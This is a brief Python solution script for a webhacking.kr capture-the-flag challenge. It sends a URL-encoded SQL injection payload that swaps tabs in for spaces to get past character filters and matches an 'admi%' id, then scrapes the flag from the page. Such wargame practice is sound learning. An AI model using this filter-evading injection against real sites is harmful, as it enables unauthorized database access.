from bs4 import BeautifulSoup
import requests

url = "https://webhacking.kr/challenge/web-12/"
PAYLOAD = "index.php?no=1234%29%09or%09id%09like%09%27admi%25%27%3B--%09-"
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'

cookie = {'PHPSESSID':PHPSESSID}

# 풀이
# 1. SQL Injection 필터링 우회 (tab, single quote, semi colon, right parentheses)


resp = requests.get(url + PAYLOAD, cookies=cookie)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)